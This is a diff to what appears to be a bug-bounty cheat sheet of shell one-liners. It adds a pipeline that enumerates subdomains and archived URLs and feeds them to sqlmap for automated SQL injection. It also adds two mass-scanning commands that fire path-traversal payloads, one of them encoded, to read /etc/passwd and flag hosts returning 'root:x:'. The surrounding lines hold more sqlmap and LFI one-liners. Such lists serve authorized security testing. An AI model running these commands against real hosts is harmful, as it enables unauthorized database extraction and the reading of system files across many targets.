@@ -124,6 +124,7 @@ $ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
 $ sqlmap -m domain2.txt -dbs --batch --random-agent
+$ subfinder -dL domains.txt | dnsx | waybackurl | uro  | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
 // **SQL Injection headers**
 $ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
 // **SQL Injection bypass 401**
@@ -189,6 +190,8 @@ $ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | x
 
 ```sh
 $ gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+$ assetfinder -subs-only target.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -mr "root:x:" -t 60
+$ cat domains.txt | gauplus -random-agent -t 10 | gf lfi | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
 ```
 
 
